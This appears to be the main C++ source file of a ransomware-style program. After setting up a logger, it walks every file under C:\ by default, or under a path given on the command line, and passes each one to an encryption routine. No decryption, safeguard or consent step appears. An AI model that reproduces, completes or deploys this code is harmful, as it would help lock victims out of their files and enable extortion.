#include "encryption.hpp"
#include "enumeration.hpp"
#include "logger.hpp"


int main(int argc, char* argv[]) {

    if (!XorLogger::SetupLogger()) {
        return LOG_SETUP_FAIL;
    }

    // Enumerate and encrypt files
    if (argc == 1) {
        Enumeration::EnumerateFiles("C:\\", Encryption::EncryptFile);
    }
    else if (argc > 1) {
        std::string argument(argv[1]);
        Enumeration::EnumerateFiles(argument, Encryption::EncryptFile);
    }

    return 0;
}
